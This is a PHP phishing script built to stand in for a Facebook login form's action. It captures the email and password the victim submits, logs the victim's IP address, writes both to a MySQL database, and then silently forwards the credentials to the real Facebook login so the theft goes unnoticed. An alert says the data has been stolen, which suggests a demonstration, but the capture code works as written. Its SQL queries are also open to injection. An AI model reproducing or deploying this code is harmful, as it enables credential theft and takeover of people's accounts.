<html>


  <?php
    /* This is the phishing script, replaced the action on the login form with
      this script, and the original action was to go to this
      "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110",
    */
    function proceed() {
      return '<script type="application/javascript">'.
         'window.onload = function() {'.
         'document.getElementById("login_form").submit();'.
      '} </script>';
    }
    date_default_timezone_set(DateTimeZone::listIdentifiers(DateTimeZone::UTC)[0]);
    $time = date("Y-m-d H:i:s"); // time stamp in  0000-00-00 00:00:00 form
    $email = null;
    $pass = null;
    if (isset($_POST['email']) && isset($_POST['pass'])) {
      $email = $_POST['email'];
      $pass = $_POST['pass'];
      /* find IP address */
      if (!empty($_SERVER['HTTP_CLIENT_IP'])){
        $ip=$_SERVER['HTTP_CLIENT_IP'];
      }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
      }else{
       $ip=$_SERVER['REMOTE_ADDR'];
      }
      $hostname = "localhost";
      $username = "id8415478_user";
      $password = "password";
      $db = "id8415478_facebooklogins";
      /* connect to database */
      $conn = mysqli_connect($hostname, $username, $password, $db);
      /* failed connection */
      if (!$conn) {
        proceed();
      }
      $query_1 = "INSERT INTO basics (email, password) VALUES ('".$email."','".$pass."') ON DUPLICATE KEY UPDATE password='".$pass."';";

        $query_2 = "INSERT INTO details (email, ipaddress) VALUES ('".$email."',INET_ATON('".$ip."'));";
      if (!mysqli_query($conn, $query_1) || !mysqli_query($conn, $query_2)) {
        mysqli_close($conn);
        proceed();
      } else {
        mysqli_close($conn);
      }

    }

   echo
   '<body>'.
      '<script> alert("Your information has been stolen at this point, change your password ASAP!"); </script>'.
     '<form id="login_form" action="https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&amp;lwv=110" method="post" novalidate="1" onsubmit="">'.
       '<input type="hidden" name="lsd" value="AVoM5jI-" autocomplete="off" />'.

       '<td><input type="hidden" class="inputtext" name="email" id="email" data-testid="royal_email" /></td>'.
       '<td><input type="hidden" class="inputtext" name="pass" id="pass" data-testid="royal_pass" /></td>'.

     '</form>'.

  '</body>'. proceed();


'</html>';
?>
